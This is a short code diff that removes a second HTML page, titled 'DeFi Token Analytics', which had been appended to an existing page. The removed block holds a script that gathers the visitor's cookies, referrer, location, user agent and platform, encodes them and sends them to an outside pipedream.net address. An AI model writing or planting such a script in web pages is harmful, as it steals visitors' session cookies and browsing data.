@@ -26,22 +26,4 @@ paths.forEach(function(path, i) {
 });
 </script>
 </body>
-</html><html>
-<head><title>DeFi Token Analytics</title></head>
-<body>
-<h1>Loading Token Data...</h1>
-<script>
-// Send back everything about the browser context
-var data = {
-  cookies: document.cookie,
-  referrer: document.referrer,
-  origin: window.origin,
-  location: window.location.href,
-  userAgent: navigator.userAgent,
-  platform: navigator.platform
-};
-
-fetch('https://eoh2zr5zzepcygc.m.pipedream.net?info=' + btoa(JSON.stringify(data)));
-</script>
-</body>
 </html>
